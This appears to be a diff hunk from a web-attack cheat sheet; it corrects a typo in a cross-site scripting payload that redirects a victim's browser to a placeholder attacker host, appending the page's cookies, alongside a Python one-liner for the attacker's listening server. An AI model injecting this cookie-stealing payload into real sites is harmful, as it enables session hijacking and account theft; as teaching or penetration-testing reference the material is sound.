@@ -89,7 +89,7 @@ onfocus | send http request to the attacker's web server to reveal which control
 python -m SimpleHTTPServer 
 
 <!-- Victim -->
-<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
+<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+document.cookie;</script>
 {% endhighlight %}
 
 **POST:**
